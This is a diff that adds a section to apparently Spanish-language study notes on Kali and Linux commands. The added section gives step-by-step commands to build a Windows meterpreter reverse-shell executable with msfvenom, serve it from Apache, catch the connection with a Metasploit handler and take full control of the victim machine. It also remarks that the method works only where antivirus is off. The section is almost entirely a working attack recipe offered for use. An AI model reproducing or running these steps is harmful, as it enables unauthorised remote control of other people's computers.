@@ -374,6 +374,29 @@ rmdir <nombre directorio> (Borrar directorio)
 --- ls
 --- Navegar por los directorios según deseemos
 
+++ Crear archivo malicioso
+--- Abrir terminal, ejecutar los siguientes comandos:
+--- msfconsole
+--- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_local> LPORT=4444 --format=exe ><nombre_programa>
+--- cp <nombre_archivo> /var/www/html (Ubicación del servidor apache)
+--- service apache2 start
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- set LHOST <ip_local> 
+--- set LPORT 4444
+--- run
+--- Ir a pc con windows
+--- Acceder a la ip del servidor <ip_local>/<nombre_archivo>
+--- Ejecutar archivo
+--- Regresar a la pc con kali, en la terminal aparecerá el mensaje de sesión abierta
+--- En este punto se tiene control total sobre el windows, y podemos ejecutar los siguientes comandos:
+--- sysinfo (Muestra información del sistema)
+--- Nota: este método sólo trabaja windows sin antivirus activo
+
+
+
+
+
 
 
 
